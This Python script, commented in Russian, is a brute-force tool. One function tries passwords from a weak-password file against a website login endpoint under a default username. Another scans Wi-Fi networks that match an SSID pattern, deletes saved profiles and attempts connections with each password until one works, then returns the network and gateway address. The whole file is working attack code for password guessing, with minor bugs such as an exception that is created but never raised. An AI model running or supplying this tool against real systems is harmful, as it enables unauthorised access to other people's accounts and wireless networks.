import requests
from wifi_connect import connect_network_windows, profile_exists, run, get_default_gateway, scan_networks_windows

# Открыть файл с паролями
def open_passfile(path_to_file: str):
    try:
        with open(path_to_file, 'r', encoding='utf-8') as file:
            return file.read().splitlines()
    except FileNotFoundError:
        raise FileNotFoundError(f"File {path_to_file} not found.")
    except UnicodeDecodeError:
        ValueError(f"Could not decode file {path_to_file}")

# Возвращает сессию и пароль
def brute_force_pass_site(api_url: str, default_sitelogin: str, path_weak_pass: str) -> tuple[requests.Session|None, str|None]:
    
    # Открываем файл с паролями
    weak_passwords = open_passfile(path_weak_pass)

    for password in weak_passwords:
        session = requests.Session()
        data = {
            "username": default_sitelogin,
            "password": password
        }
        response = session.post(api_url, data=data)
        if response.status_code == 200:
            print(f"[+] Found valid password: {password}")
            return session, password
        else:
            print(f"[-] Invalid password: {password}")

    return None, None

# Возвращает SSID
def brute_force_pass_wifi(patern_ssid: str, path_weak_pass: str) -> tuple[str|None, str|None]:
    
    # Открываем файл с паролями
    weak_passwords = open_passfile(path_weak_pass)

    results = scan_networks_windows(patern_ssid)
    if not results:
        return None, None
    ssids = [result["ssid"] for result in results]
    for ssid in ssids:
        print(f"Trying to connect to: {ssid} ...")
        if profile_exists(ssid):
            cp = run(f'netsh wlan delete profile name="{ssid}"')
            if cp.returncode != 0:
                raise RuntimeError(f"Could not delete profile {ssid}: {cp.stderr}")
        for password in weak_passwords:
            if len(password) < 8:
                continue
            if not ssid:
                raise ValueError(f"SSID with patern {patern_ssid} not found.")
            try:
                ok = connect_network_windows(ssid, password=password)
                if ok:
                    print(f"[+] Found valid password Wi-Fi: {password}")
                    ip = get_default_gateway()
                    return ssid, ip
                # else:
                    # print(f"[-] Invalid password: {password}")
            except Exception as e:
                print(f"[-] Error connecting with password {password}: {e}")

    return None



